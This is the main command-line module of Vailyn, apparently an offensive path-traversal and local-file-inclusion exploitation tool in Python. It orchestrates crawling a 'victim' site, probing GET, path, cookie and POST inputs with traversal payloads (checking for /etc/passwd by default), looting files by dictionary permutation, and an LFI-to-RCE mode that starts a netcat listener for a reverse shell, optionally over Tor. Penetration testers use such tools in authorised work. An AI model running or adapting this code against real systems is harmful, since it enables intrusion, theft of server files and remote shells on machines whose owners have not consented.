#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
_____, ___
   '+ .;
    , ;
     .

       .
     .;.
     .;
      :
      ,


┌─[Vailyn]─[~]
└──╼ VainlyStrain
"""

import subprocess
import treelib
import requests
import sys
import random
import datetime
import time
import os

import core.variables as variables

from math import factorial

from multiprocessing.pool import ThreadPool as Pool

from scrapy.crawler import CrawlerProcess

from terminaltables import SingleTable

from core.colors import color
from core.variables import (
    payloadlist,
    nullchars,
    processes,
    cachedir,
    is_windows,
)

from core.methods.list import (
    listsplit,
    listperm,
    gensplit,
)
from core.methods.select import select, select_techniques
from core.methods.tree import create_tree
from core.methods.attack import (
    phase1, phase2, lfi_rce, reset_counter
)
from core.methods.cookie import (
    read_cookie, cookie_from_file
)
from core.methods.cache import load, save, parse_url
from core.methods.tor import enable_tor
from core.methods.loot import set_date
from core.methods.notify import notify
from core.methods.print import (
    table_print,
    table_entry_print,
)
from core.methods.crawler import (
    UrlSpider,
    arjunEnum,
    crawler_query,
    crawler_path,
    crawler_cookie,
    crawler_post,
)


# initialize file tree
filetree = treelib.Tree()
filetree.create_node(color.O + "/" + color.END + color.RD, "root")


def cli(parser, opt, args, shell=True) -> int:
    """
    Vailyn's main - parse args, start attacks & print results
    """
    if (not (opt["victim"] and opt["attack"]) or
            (args.attack != 5 and not opt["phase2"]
            and not opt["nosploit"])):
        parser.print_help()
        sys.exit(
            "\n" + color.R + "[-]" + color.END + color.BOLD
            + " Invalid/missing params" + color.END + "\n"
            + color.RD + "[HINT]" + color.END + " -v, -a and -l mandatory"
        )

    loot = False
    victim2 = ""
    depth = 2
    verbose = variables.verbose
    foundfiles = [""]
    foundurls = [""]
    foundpayloads = []
    foundnullbytes = []
    foundwrappers = []
    vlnfile = "/etc/passwd"
    checkdepth = 8
    permutation_level = 2
    cookiefile = ""

    # handle optional arguments
    if opt["loot"]:
        loot = True

    if opt["vic2"]:
        victim2 = args.vic2

    if opt["depths"]:
        checkdepth = args.depths[0]
        depth = args.depths[1]
        permutation_level = args.depths[2]

    if opt["check"]:
        vlnfile = args.check

    if opt["cookie"]:
        cookiefile = args.cookie

    param = ""
    cookie = None
    post_data = ""
    selected = ""

    if opt["tor"]:
        enable_tor()

    paysplit = listsplit(payloadlist, round(len(payloadlist) / processes))

    if (args.attack == 1):
        """
        query mode (scan GET Parameter)
        """
        if not opt["param"]:
            parser.print_help()
            sys.exit(
                "\n" + color.R + "[-]" + color.END + color.BOLD
                + " Invalid/missing params" + color.END + "\n"
                + color.RD + "[HINT]" + color.END
                + " -p mandatory for -a 1"
            )
        print("{0}[Vailyn]{1} PARAM{2}|{3}".format(
            color.RD,
            color.END + color.RB,
            color.END + color.RD,
            color.END,
        ))
        param = args.param
    elif (args.attack == 2):
        """
        path mode (scan URL Path)
        """
        print("{0}[Vailyn]{1} PATH{2}|{3}".format(
            color.RD,
            color.END + color.RB,
            color.END + color.RD,
            color.END,
        ))
    elif (args.attack == 3):
        """
        cookie mode (scan HTTP cookie)
        """
        print("{0}[Vailyn]{1} COOKIE{2}|{3}".format(
            color.RD,
            color.END + color.RB,
            color.END + color.RD,
            color.END,
        ))
    elif (args.attack == 4):
        """
        POST mode (scan POST/Form Data)
        """
        if not opt["post"]:
            parser.print_help()
            sys.exit(
                "\n" + color.R + "[-]" + color.END
                + color.BOLD + " Invalid/missing params"
                + color.END + "\n" + color.RD + "[HINT]" + color.END
                + " -s mandatory for -a 4"
            )
        print("{0}[Vailyn]{1} POST{2}|{3}".format(
            color.RD,
            color.END + color.RB,
            color.END + color.RD,
            color.END,
        ))
        post_data = args.post
        if "INJECT" not in post_data:
            parser.print_help()
            sys.exit(
                "\n" + color.R + "[-]" + color.END + color.BOLD
                + " Invalid/missing params" + color.END + "\n"
                + color.RD + "[HINT]" + color.END
                + " -s needs to contain INJECT at injection point"
            )
        if "=" not in post_data:
            parser.print_help()
            sys.exit(
                "\n" + color.R + "[-]" + color.END + color.BOLD
                + " Invalid/missing params" + color.END + "\n"
                + color.RD + "[HINT]" + color.END
                + " -s needs to be of form P1=V1&P2=V2"
            )
    elif args.attack == 5:
        """
        crawler mode (scan every URL belonging to target with every vector)
        """
        print("{0}[Vailyn]{1} v.ALL{2}|{3}".format(
            color.RD,
            color.END + color.RB,
            color.END + color.RD,
            color.END,
        ))
    else:
        parser.print_help()
        sys.exit("\n" + color.R + "[-]" + color.END + color.BOLD
        + " Invalid/missing params" + color.END + "\n" + color.RD
        + "[HINT]" + color.END + " -a needs to be in [1..5]"
    )

    print("{0} └──{1} {2}{3}vainly{1}".format(
        color.RD,
        color.END,
        color.CURSIVE,
        color.END + color.RC + color.BOLD,
    ))
    time.sleep(0.5)

    if variables.tor:
        print("\n{0} [TOR]{1}{6} IP{1}{0}|{1}{5} {2} {1}{4}>{1} {3}".format(
                color.RD, color.END, variables.initip, variables.torip,
                color.BOLD, color.CURSIVE, color.O,
            ))

    if args.attack == 5:
        crawlcookies = {}
        arjunjar = None
        if cookiefile != "":
            arjunjar = cookie_from_file(cookiefile)
            crawlcookies = requests.utils.dict_from_cookiejar(arjunjar)

        print(
            "\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Link Spider\n".format(
                color.RD, color.END,
            )
        )
        time.sleep(0.5)
        ua = variables.user_agents[
            random.randrange(0, len(variables.user_agents))
        ]
        process = CrawlerProcess(
            {"USER_AGENT": ua, "LOG_ENABLED": False}
        )
        process.crawl(
            UrlSpider,
            cookiedict=crawlcookies,
            url=args.victim,
        )
        process.start()
        subdir = parse_url(args.victim)

        with open(cachedir + subdir + "spider-phase0.txt", "r") as vicfile:
            for line in vicfile:
                variables.viclist.append(line.strip())

        DATA = []
        for target in variables.viclist:
            DATA.append(table_print([target]))

        linkTable = SingleTable(DATA, "[ {}App Links{} ]".format(
            color.END, color.RD,
        ))
        linkTable.inner_heading_row_border = False
        print("{}{}{}".format(color.RD, linkTable.table, color.END))

        time.sleep(1)
        print("\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Param Enum (GET)\n".format(
            color.RD, color.END,
        ))

        time.sleep(0.5)
        siteparams = arjunEnum(cookiefile=cookiefile)
        time.sleep(1)
        print("\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Query Analysis\n".format(
            color.RD, color.END,
        ))

        time.sleep(0.5)
        queryattack = crawler_query(
            siteparams, victim2, verbose, checkdepth, vlnfile, cookiefile,
        )
        time.sleep(1)
        print("\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Path Analysis\n".format(
            color.RD, color.END,
        ))

        time.sleep(0.5)
        pathattack = crawler_path(
            victim2, verbose, checkdepth, vlnfile, cookiefile,
        )
        time.sleep(1)
        print("\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Cookie Analysis\n".format(
            color.RD, color.END,
        ))

        time.sleep(0.5)
        cookieattack = crawler_cookie(
            victim2, verbose, checkdepth, vlnfile, cookiefile,
        )
        time.sleep(1)
        print("\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Param Enum (POST)\n".format(
            color.RD, color.END,
        ))

        time.sleep(0.5)
        postparams = arjunEnum(post=True, cookiefile=cookiefile)
        time.sleep(1)
        print("\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} POST Analysis\n".format(
            color.RD, color.END,
        ))

        time.sleep(0.5)
        postattack = crawler_post(
            postparams, victim2, verbose, checkdepth, vlnfile, cookiefile,
        )
        time.sleep(2.5)
        print("\n\n{}FINAL RESULTS{}\n".format(
            color.BOLD + color.UNDERLINE, color.END,
        ))

        DATA = [table_print(
            ("URL", "Parameter", "Payloads", "Nullbytes", "Wrappers"),
        )]
        for victim, sub in queryattack.items():
            for param, pair in sub.items():
                payloads = table_entry_print(pair[0])
                nullbytes = table_entry_print(pair[1])
                wrappers = table_entry_print(pair[2])
                DATA.append(table_print(
                    (victim, param, payloads, nullbytes, wrappers),
                ))

        queryTable = SingleTable(
            DATA, "[ {}Query Attack{} ]".format(color.END, color.RD),
        )
        print("{}{}{}\n".format(color.RD, queryTable.table, color.END))

        DATA = [table_print(("URL", "Payloads", "Nullbytes", "Wrappers"))]
        for victim, pair in pathattack.items():
            payloads = table_entry_print(pair[0])
            nullbytes = table_entry_print(pair[1])
            wrappers = table_entry_print(pair[2])
            DATA.append(table_print(
                (victim, payloads, nullbytes, wrappers),
            ))

        pathTable = SingleTable(
            DATA, "[ {}Path Attack{} ]".format(color.END, color.RD),
        )
        print("{}{}{}\n".format(color.RD, pathTable.table, color.END))

        DATA = [table_print(
            ("URL", "Cookie", "Payloads", "Nullbytes", "Wrappers"),
        )]
        for victim, sub in cookieattack.items():
            for cname, pair in sub.items():
                payloads = table_entry_print(pair[0])
                nullbytes = table_entry_print(pair[1])
                wrappers = table_entry_print(pair[2])
                DATA.append(table_print(
                    (victim, cname, payloads, nullbytes, wrappers),
                ))

        cookieTable = SingleTable(
            DATA, "[ {}Cookie Attack{} ]".format(color.END, color.RD),
        )
        print("{}{}{}\n".format(color.RD, cookieTable.table, color.END))

        DATA = [table_print(
            ("URL", "Parameter", "Payloads", "Nullbytes", "Wrappers"),
        )]
        for victim, sub in postattack.items():
            for param, pair in sub.items():
                payloads = table_entry_print(pair[0])
                nullbytes = table_entry_print(pair[1])
                wrappers = table_entry_print(pair[2])
                DATA.append(table_print(
                    (victim, param, payloads, nullbytes, wrappers),
                ))

        postTable = SingleTable(
            DATA, "[ {}POST Attack{} ]".format(color.END, color.RD),
        )
        print("{}{}{}\n".format(color.RD, postTable.table, color.END))
        notify("Crawler finished scanning {} URLs.".format(
            len(variables.viclist),
        ))
        return

    # fetch and select cookie for cookie mode
    if args.attack == 3:
        print("\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Parsing Cookie\n".format(
            color.RD, color.END,
        ))
        cookie, selected = read_cookie(args.victim)

    print("\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Analysis Phase\n".format(
        color.RD, color.END,
    ))
    vlnysis = True

    # present option to skip phase 1 if cache from previous attack present
    targetcache = parse_url(args.victim)
    if (os.path.exists(cachedir + targetcache + "payloads.cache")
            and os.path.exists(cachedir + targetcache + "nullbytes.cache")
            and os.path.exists(cachedir + targetcache + "wrappers.cache")):
        choice = input(
            "{0}[?]{1}{2} Cache{1}{0}|{1} Load from".format(
                color.RD, color.END, color.O,
            )
            + " previous attack?\n{0} └──{1}".format(color.RD, color.END)
            + " {1}enter if not{0} :> ".format(
                color.END, color.CURSIVE,
            ))
        if choice != "":
            vlnysis = False
            foundpayloads, foundnullbytes, foundwrappers = load(targetcache)
        else:
            print()

    if vlnysis:
        starting_time = time.time()
        # initiate phase 1 - vulnerability analysis
        reset_counter()
        with Pool(processes=processes) as pool:
            res = [pool.apply_async(phase1, args=(
                        args.attack, args.victim, victim2, param, cookie,
                        selected, verbose, checkdepth, splitty, vlnfile,
                        cookiefile, post_data, None,
                )) for splitty in paysplit]
            for i in res:
                # fetch results
                tuples = i.get()
                foundpayloads += tuples[0]
                foundnullbytes += tuples[1]
                foundwrappers += tuples[2]

        ending_time = time.time()
        vuln_time = ending_time - starting_time
        # save working payloads to cache
        save(targetcache, foundpayloads, foundnullbytes, foundwrappers)
    else:
        vuln_time = 0.0

    # determine if phase 2 happens
    attack = False
    if foundpayloads:
        attack = True
        message = "Path Traversal detected!"
        if not args.nosploit:
            message += " Select Payloads for Phase 2"
        if vlnysis:
            notify(message)
        selectedpayloads = select(
            foundpayloads, nosploit=args.nosploit,
        )
        if foundnullbytes:
            selectednullbytes = select(
                foundnullbytes, nullbytes=True, nosploit=args.nosploit,
            )
        else:
            selectednullbytes = []
        if foundwrappers:
            selectedwrappers = select(
                foundwrappers, wrappers=True, nosploit=args.nosploit,
            )
        else:
            selectedwrappers = []
    else:
        selectedwrappers = []
        if not opt["nosploit"]:
            notify("No payload succeeded. Attack anyways?")
            cont = input(
                "\n{0}[✗]{1} No payload succeeded.".format(color.RD, color.END)
                + " Attack anyways?\n{0} └──{1} ".format(color.RD, color.END)
                + "{1}enter if not{0} :> ".format(color.END, color.CURSIVE)
            )
            if cont != "":
                attack = True
                # attack with everything if phase 1 was unsuccessful
                selectedpayloads = payloadlist
                selectednullbytes = nullchars
                selectedwrappers = [""]
                if variables.lfi:
                    selectedwrappers += variables.phase1_wrappers

    if opt["nosploit"]:
        attack = False

    if not selectedwrappers:
        selectedwrappers = [""]

    # start the exploitation phase
    starting_time = time.time()

    techniques = []

    if attack:
        reset_counter()
        print("\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Sploit Phase\n".format(
            color.RD, color.END,
        ))
        if variables.revshell:
            if is_windows:
                lis = input(
                    "[?] Are you listening on {}".format(
                        variables.LISTENIP,
                    )
                    + ", port {}? (enter if not) :> ".format(
                        variables.LISTENPORT,
                    )
                )
                if lis == "":
                    sys.exit(
                        "Please start a listener manually "
                        "before starting the attack.",
                    )
            else:
                with open(os.devnull, "w") as DEVNULL:
                    subprocess.Popen(
                        ["konsole", "--hold", "-e", "nc -lvp {}".format(
                            variables.LISTENPORT,
                        )],
                        close_fds=True,
                        stdout=DEVNULL,
                        stderr=subprocess.STDOUT,
                    )
            techniques = select_techniques()
            starting_time = time.time()
            lfi_rce(
                techniques, args.attack, args.victim, victim2, param,
                cookie, selected, verbose, selectedpayloads, selectednullbytes,
                selectedwrappers, cookiefile, post_data, depth,
            )
        else:
            set_date()
            sdirlen = 0
            with open(args.phase2[2], "r") as f:
                sdirlen = sum(1 for line in f if line.rstrip()) + 1

            if opt["phase2"] and sdirlen > 100:
                print("{}  Preparing dictionaries...{}".format(
                    color.RC, color.END,
                ))

            dirlen2 = sdirlen
            felems = dirlen2 - 1
            i = 1
            while (i <= permutation_level):
                if 0 <= i + 1 and i + 1 <= felems:
                    cur = factorial(felems) / factorial(felems - i - 1)
                else:
                    cur = 0
                dirlen2 += cur
                i += 1
            dirlen = int(dirlen2)
            splitted = gensplit(
                listperm(args.phase2[2], permutation_level),
                round(dirlen / processes),
            )

            starting_time = time.time()
            with Pool(processes=processes) as pool:
                res = [pool.apply_async(phase2, args=(
                    args.attack, args.victim, victim2,
                    param, cookie, selected, args.phase2[1],
                    slist, depth, verbose, loot,
                    selectedpayloads, selectednullbytes,
                    selectedwrappers, cookiefile, post_data,
                    dirlen, None,
                )) for slist in splitted]

                for i in res:
                    # fetch results
                    restuple = i.get()
                    foundfiles += restuple[0]
                    foundurls += restuple[1]

    ending_time = time.time()
    attack_time = ending_time - starting_time
    total_time = vuln_time + attack_time

    readable_time = datetime.timedelta(seconds=total_time)
    if not args.nosploit:
        notification = "Attack done in {}.".format(readable_time)
        if variables.revshell:
            techniquesTried = len(techniques)
            if 6 in techniques:
                techniquesTried = techniquesTried + variables.wrapperCount - 1
            mult = "" if techniquesTried == 1 else "s"
            notification += " {} technique{} tried.".format(
                techniquesTried, mult,
            )
        else:
            mult = "" if (len(foundfiles) - 1) == 1 else "s"
            notification += " Found {} file{}.".format(
                len(foundfiles) - 1, mult,
            )
        notify(notification)

    # display found files in a file tree
    print("\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Directory Tree\n".format(
        color.RD, color.END,
    ))
    if foundfiles:
        create_tree(filetree, foundfiles)
        filetree.show()
    if not foundurls:
        print("nothing found")

    print("{}Scan completed in {}.{}".format(color.RC, readable_time, color.END))
    if variables.tor and not is_windows:
        stop = input(
            color.END + " [?] Do you want to terminate the",
            " Tor service? (enter if not) :> "
        )
        if stop != "":
            try:
                subprocess.run(["systemctl", "stop", "tor"])
            except OSError:
                subprocess.run(["service", "tor", "stop"])
            except OSError:
                subprocess.run(["brew", "services", "stop", "tor"])
            except Exception as e:
                sys.exit(e)
